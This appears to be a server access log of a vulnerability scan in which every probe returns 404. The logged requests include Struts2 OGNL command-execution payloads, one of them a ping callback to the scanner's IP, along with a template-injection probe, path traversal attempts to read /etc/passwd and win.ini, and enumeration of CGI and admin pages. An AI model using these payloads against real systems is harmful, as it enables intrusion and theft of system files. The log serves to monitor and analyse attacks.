+INFO:     198.82.145.75:51598 - "GET //%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3D%21%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%2C%28%40java.lang.Runtime%40getRuntime%28%29%29.exec%28%27id%27%29.waitFor%28%29%7D.action HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51612 - "POST /flex2gateway/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51626 - "POST /messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51638 - "POST /blazeds/messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51652 - "POST /lcds/messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51666 - "GET /cgi-bin/admin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36214 - "GET /cgi-bin/admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36228 - "GET %24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping%20-c%203%20-p%20597044327857594a5f35%20198.82.145.75%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D// HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36244 - "GET /cgi-bin/admin.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44852 - "GET /cgi-bin/administrator HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44866 - "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44874 - "GET %24%7B%7B57550614%2B16044095%7D%7D// HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37354 - "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37364 - "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34486 - "GET /cgi-bin/cart.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34502 - "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:53196 - "GET /cgi-bin/count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:53200 - "GET /cgi-bin/Count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38810 - "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38812 - "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35906 - "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35918 - "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59942 - "GET /cgi-bin/help.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59952 - "GET /cgi-bin/hi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33524 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33530 - "GET /cgi-bin/index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33960 - "GET /cgi-bin/index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33974 - "GET /cgi-bin/login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44436 - "GET /cgi-bin/mailit.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44448 - "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:46906 - "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:46910 - "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34200 - "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34210 - "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51894 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51906 - "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:48500 - "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:48508 - "GET /cgi-bin/search HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42386 - "GET /cgi-bin/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42394 - "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39638 - "GET /cgi-bin/status HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39646 - "GET /cgi-bin/status.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37354 - "GET /cgi-bin/test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37358 - "GET /cgi-bin/test.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35570 - "GET /cgi-bin/test-cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35580 - "GET /cgi-bin/upload.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54908 - "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54924 - "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:50596 - "GET /cgi-bin/wa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:50608 - "GET /cgi-bin/wa.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40534 - "GET /cgi-bin/wa.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40538 - "GET /cgi-bin/whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51264 - "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51266 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35148 - "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35164 - "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:46954 - "GET /index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:46960 - "GET /index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33164 - "GET /index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33170 - "GET /nph-mr.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:56010 - "GET /query.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:56020 - "GET /session_login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32966 - "GET /show_bug.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32974 - "GET /test HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:49502 - "GET /test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:49530 - "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:47654 - "GET /whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:47662 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:52016 - "GET /wwwadmin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:52018 - "GET /wwwboard.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37556 - "GET /xampp/cgi.cgi HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     142.157.206.83:1091 - "GET / HTTP/1.1" 404 Not Found
+INFO:     142.157.206.83:1091 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     3.218.35.239:27831 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     20.171.207.12:53438 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:59756 - "GET / HTTP/1.0" 404 Not Found
+INFO:     198.82.145.75:59758 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59766 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59778 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59794 - "GET /properties/description.dhtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59800 - "GET /login/?next=/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59812 - "GET /properties/configuration.php?tab=Status HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59828 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59830 - "GET /header.php?tab=status HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59844 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59856 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59858 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59870 - "GET /login.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59882 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59894 - "GET /this_server/all_settings.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59910 - "GET /Home.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59912 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59920 - "GET // HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59932 - "GET /authenticate/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59936 - "GET /start.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59950 - "GET /intruvert/jsp/admin/Login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59960 - "GET /tmui/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59968 - "GET /commoncgi/servlet/CCGIServlet?ApHost=PDT_InterScan_NT&CGIAlias=PDT_InterScan_NT&File=logout.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59972 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59976 - "GET /xmldata?item=All HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59986 - "GET /netmri/config/userAdmin/login.tdf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:59992 - "GET /upnp/BasicDevice.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60000 - "GET /scgi-bin/platform.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60002 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60014 - "GET /admin/login.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60016 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60032 - "GET /en/main.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60040 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60054 - "GET /mgmt/login?dest=%2Fmgmt%2Fgui%3Fp%3Dhome&reason=&username= HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60060 - "GET /.cobalt HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60066 - "GET /dms2/Login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60070 - "GET /admin.back HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60072 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60088 - "GET /file HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60100 - "GET /home.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60104 - "GET /wavemaster.internal HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60120 - "GET /sws/data/sws_data.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60126 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60128 - "GET /wcd/system.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60144 - "PLITIU / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60156 - "GET /js/Device.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60160 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60166 - "GET /ptz.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60168 - "GET /MSWSMTP/Common/Authentication/Logon.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60170 - "GET /admin/login.jsp HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:60180 - "GET /loginMsg.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60190 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60200 - "GET /XxchyZnMZYyH.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60212 - "GET /XxchyZnMZYyH.cgi HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:60218 - "GET /XxchyZnMZYyH.sh HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:60226 - "GET /XxchyZnMZYyH.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60242 - "GET /XxchyZnMZYyH.inc HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60244 - "GET /XxchyZnMZYyH.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60246 - "GET /XxchyZnMZYyH.asp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60258 - "GET /XxchyZnMZYyH.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60270 - "GET /XxchyZnMZYyH.php3 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60280 - "GET /XxchyZnMZYyH.cfm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60282 - "GET /cgi-bin/XxchyZnMZYyH.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60288 - "GET /cgi-bin/XxchyZnMZYyH.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60296 - "GET /cgi-bin/XxchyZnMZYyH.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60306 - "GET /cgi-bin/XxchyZnMZYyH.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60312 - "GET /cgi-bin/XxchyZnMZYyH.inc HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60324 - "GET /cgi-bin/XxchyZnMZYyH.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60340 - "GET /cgi-bin/XxchyZnMZYyH.asp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60344 - "GET /cgi-bin/XxchyZnMZYyH.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60360 - "GET /cgi-bin/XxchyZnMZYyH.php3 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60364 - "GET /cgi-bin/XxchyZnMZYyH.cfm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60370 - "GET /scripts/XxchyZnMZYyH.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60380 - "GET /scripts/XxchyZnMZYyH.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60382 - "GET /scripts/XxchyZnMZYyH.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60388 - "GET /scripts/XxchyZnMZYyH.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60390 - "GET /scripts/XxchyZnMZYyH.inc HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60394 - "GET /scripts/XxchyZnMZYyH.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60404 - "GET /scripts/XxchyZnMZYyH.asp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60410 - "GET /scripts/XxchyZnMZYyH.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60418 - "GET /scripts/XxchyZnMZYyH.php3 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60432 - "GET /scripts/XxchyZnMZYyH.cfm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60440 - "GET /ext-js/app/common/zld_product_spec.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60456 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60472 - "GET /xampp/index.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60476 - "GET /SnoopServlet/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60484 - "GET /snoopservlet/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60488 - "GET /snoop/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60498 - "GET /servlet/SnoopServlet/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60508 - "GET /servlet/snoopservlet/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60510 - "GET /servlet/snoop/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60522 - "GET /triton-help/en/first.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60534 - "GET /console/login/LoginForm.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60538 - "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60550 - "GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60566 - "GET /../../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60576 - "GET ../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60582 - "GET ../../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60584 - "GET ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60598 - "GET ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60606 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60610 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60626 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60630 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60646 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60658 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60674 - "GET //../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60686 - "GET //../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60696 - "GET /.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60706 - "GET /.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60722 - "GET /../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60730 - "GET /../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60736 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60746 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60754 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60770 - "GET %5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60782 - "GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60786 - "GET /.../.../.../.../.../.../.../.../.../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60802 - "GET /...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60818 - "GET /...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60824 - "GET /..../..../..../..../..../..../..../..../..../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60830 - "GET /..../..../..../..../..../..../..../..../..../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60838 - "GET /....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60850 - "GET /....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60860 - "GET /././././././../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60868 - "GET /././././././../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60870 - "GET .%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C/windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60880 - "GET .%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60884 - "GET /nessus%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60890 - "GET /nessus%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60902 - "GET /%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60918 - "GET /%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60930 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60942 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60956 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60960 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60974 - "GET /%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60976 - "GET /%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60980 - "GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60986 - "GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60990 - "GET /scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32770 - "GET /scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32772 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32786 - "GET /./../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32790 - "GET //../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32794 - "GET /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32810 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32820 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32832 - "GET /./../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32838 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32842 - "GET /././././././../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32844 - "GET /%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32856 - "GET /scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32858 - "GET /scripts/fake.cgi?arg=/dir/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32864 - "GET /active.log HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32878 - "GET /main_internet.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32888 - "GET /cfg/shortcuts HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32894 - "GET /hc/error/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32904 - "GET /ui/login.action HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32920 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32934 - "GET /hc/admin/login/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32938 - "GET /portal/diag/index.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32946 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32956 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32960 - "GET /menu.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32974 - "GET /auth/login HTTP/1.1" 404 Not Found
